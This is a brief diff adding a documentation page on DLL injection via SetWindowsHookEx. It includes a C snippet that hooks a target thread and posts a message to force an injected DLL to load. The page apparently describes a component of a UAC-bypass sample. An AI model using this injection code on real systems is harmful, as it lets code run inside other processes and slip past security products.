@@ -1,0 +1,19 @@
+
+                        DLL Injection using SetWindowsHookEx
+Overview
+This code sets a windows hook with the DLL to be injected and a dummy function that simply passes the hooked message to the next handler. After setting the hook, a thread message is sent to force the DLL to be loaded to handle it.
+hDll = LoadLibraryEx(L"ElevatedComTestDLL.dll",NULL, DONT_RESOLVE_DLL_REFERENCES);
+hookProcAddr=(HOOKPROC)GetProcAddress(hDll, "_CBTProc@12");
+injectHook=SetWindowsHookEx(WH_GETMESSAGE,hookProcAddr, hDll, tid);
+if(!PostThreadMessageW(tid,WM_RBUTTONDOWN, (WPARAM) 0, (LPARAM)0))
+    return false;
+This is a well-known technique and may trigger PSPPersonal Security Product (Anti-Virus) warnings.
+Source Code
+Public Internet
+Component Reuse
+UACBypass sample
+
+Previous versions:
+| 1 
+|
+                    
